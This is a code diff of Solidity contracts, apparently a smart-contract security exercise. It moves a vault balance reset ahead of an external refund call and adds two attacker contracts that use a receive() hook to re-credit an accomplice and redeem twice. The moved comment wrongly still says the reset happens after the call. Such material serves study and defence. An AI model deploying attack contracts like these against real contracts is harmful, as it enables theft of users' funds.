@@ -20,11 +20,10 @@ contract C {
         // this function has been fixed by changing the logic in Vault.
         // Instead of using the takeAll function, we now use the combination of balanceOf and reset.
         uint256 amt = vault.balanceOf(to);
+        vault.reset(to);    // zeroing the balance AFTER the call does not allow the attacked to corrupt the vault balance
 
         (bool success, ) = to.call{value: amt}("");
         require(success, "Refund failed");
-
-        vault.reset(to);    // zeroing the balance AFTER the call does not allow the attacked to corrupt the vault balance
 
         vault.setEnabled(false);
     }
@@ -33,6 +32,27 @@ contract C {
         vault.setEnabled(true); 
         vault.increase(msg.sender, msg.value);
         vault.setEnabled(false);
+    }
+}
+
+contract Attacker1 {
+    C c;
+    address att2;
+    Vault v;
+    function attacker() public {
+        c.redeem(payable(address(this)));
+        Attacker2(att2).redeem();
+    }
+    receive() external payable {
+        v.increase(att2, 1000);
+    }
+}
+
+contract Attacker2 {
+    C c;
+    Vault v;
+    function redeem() external {
+        c.redeem(payable(address(this)));
     }
 }
 
